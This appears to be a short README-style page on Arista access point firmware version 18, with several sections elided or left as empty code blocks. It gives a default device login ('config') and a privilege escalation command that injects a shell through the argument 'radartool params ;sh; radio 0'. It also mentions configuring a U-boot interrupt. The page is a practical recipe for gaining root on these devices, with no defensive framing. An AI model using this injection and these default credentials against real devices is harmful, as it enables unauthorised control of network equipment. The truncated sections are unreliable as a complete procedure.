# Arista AP firmware
AP firmware version 18 has a privilege escalation vulnerability. U-boot interrupt can be configured.</br>
Default AP account credentials:`config`</br>
Privilege escalation command:`radartool params ;sh; radio 0`</br>
Configure U-boot interrupt（example uses`n`）</br>

## AP Models Covered by Firmware:
| AP Models   | Test |
| ------- | :-----: | 
| C-200  |         | 
| C-230  |         | 
...
## Example of Logging into AP Factory System:
```
(none) login: config
Password: 
...
[config]$ 
```
## Command to Check AP Factory System Version:
```
...
## Example of Upgrading AP Factory Firmware:
```
...
```
## Example of Privilege Escalation and Configuring U-Boot Interrupt on AP Factory System:
```
[config]$ 
